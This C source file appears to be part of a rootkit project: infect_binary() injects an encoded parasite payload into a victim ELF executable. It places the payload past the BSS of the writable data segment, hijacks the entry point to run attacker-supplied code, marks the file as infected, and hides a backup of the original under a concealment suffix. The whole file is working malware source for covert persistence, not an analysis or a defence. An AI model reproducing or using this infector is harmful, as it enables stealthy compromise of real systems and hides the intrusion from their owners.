/*
 * $Id: infect.c, in-the-bss parasite infector, ynit.S concept
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>

#include "sktypes.h"
#include "infect.h"
#include "parasite.h"
#include "config.h"
#include "sk.h"

int	infect_binary(char *fn, char *exec)
{
	int	fd, bk, new;
	ELF	*elf;
	PH	*ph;
	SH	*sh;
	char	*m;
	int	size;
	int	i, j;
	ulong	vaddr, vpos;
	ulong	bss;
	ulong	*u;
	uchar	buf[256];
	int	es = strlen(exec) + 1;
	struct	stat st;

	eprintf("Infecting %s (%s)...", fn, exec);

#define SZ (PARASITE_SIZE + es)


	fd = open(fn, O_RDONLY);
	if (fd < 0) {
		perror(fn);
		return 1;
	}

	/* get size of a file */
	size = lseek(fd, 0, SEEK_END);

	/* map victim */
	m = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0);
	if (m == MAP_FAILED) {
		perror("mmap");
		close(fd);
		return 1;
	}

	elf = (void *) m;

	/* check if infected */
	if (elf->arch == 6) {
		eprintf("%s: already infected\n", fn);
		goto mout;
	}
	
	if (fstat(fd, &st)) {
		perror(fn);
		goto mout;
	}

	sprintf(buf, "%s%s", fn, cfg.hidestr);
	bk = open(buf, O_CREAT|O_WRONLY, st.st_mode & 0777);
	sprintf(buf, "%s%s", fn, ".XXX");
	new = open(buf, O_CREAT|O_RDWR|O_TRUNC, st.st_mode & 0777);
	if (bk < 0) {
		perror("can't create backup");
		goto mout;
	}
	if (new < 0) {
		perror("can't create temp");
		goto mout;
	}
	fchown(bk, st.st_uid, st.st_gid);
	fchown(new, st.st_uid, st.st_gid);
	i = write(bk, m, size);
	if (i < 0) {
		perror("write");
		close(bk);
		goto mout;
	}
	if (i != size) {
		eprintf("incomplete write while backing up\n");
		close(bk);
		goto mout;
	}
	close(bk);
	i = write(new, m, size);
	if (i < 0) {
		perror("write");
		close(new);
		goto mout;
	}
	if (i != size) {
		eprintf("incomplete write while creating temp\n");
		close(new);
		goto mout;
	}
	munmap(m, size);
	close(fd);
	fd = new;
	m = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (m == MAP_FAILED) {
		perror("mmap");
		close(fd);
		return 1;
	}

	elf = (void *) m;
	

	strcpy(buf, exec);
	for (i = 0; i < es; i++) {
		buf[i] = parasite_encode(buf[i]);
	}

	/* save old entrypoint */
	orig_ep = elf->ep;
	/* find first data segment */
	ph = (void *) (m + (ulong) elf->phtab);

	for (i = 0; i < elf->phnum; i++, ph++) {
		/* PT_LOAD & rw- */
		if (ph->type == 1) {
			if (ph->flags == 6)
				goto found;
		}
	}
	eprintf("no data segment\n");
	goto mout;
found:
	bss = ph->va + ph->fsize;

	/* find relocs */
	sh = (void *) (m + (ulong) elf->shtab);
	for (i = 0; i < elf->shnum; i++, sh++) {
		if (sh->type == 9) {
			u = (void *) (m + (ulong) sh->off);
			for (j = 0; j < sh->size / 8; j++, u+=2) {
				if (*u > bss) bss = *u + 4;
			}
		}
	}

	/* select our place in file */
	if ((ph->off + bss - ph->va) > size) {
		vpos = lseek(fd, ph->off + bss - ph->va, SEEK_SET);
	} else {
		vpos = size;
	}

	/* calculate virus virtual address */
	vaddr = vpos + ph->va - ph->off;

	/* setup entrypoint */
	elf->ep = vaddr;
	vaddr += SZ;

	/* datasize */
	ph->fsize = vaddr - ph->va;

	/* enlarge bss if needed */
	if (ph->msize < ph->fsize) ph->msize = ph->fsize;

	elf->arch = 6;
	ph->flags = 7;

	/* store how much we must clean */
	bss_len = vaddr - bss;

	/* where bss begun */
	bss_addr = bss;

	munmap(m, size);
	write(fd, parasite_start, PARASITE_SIZE);
	write(fd, buf, es);
	close(fd);
	unlink(fn);
	sprintf(buf, "%s%s", fn, ".XXX");
	rename(buf, fn);
	
	eprintf("Done!\n");
	return 0;
mout:
	munmap(m, size);
	close(fd);
	return 1;

}
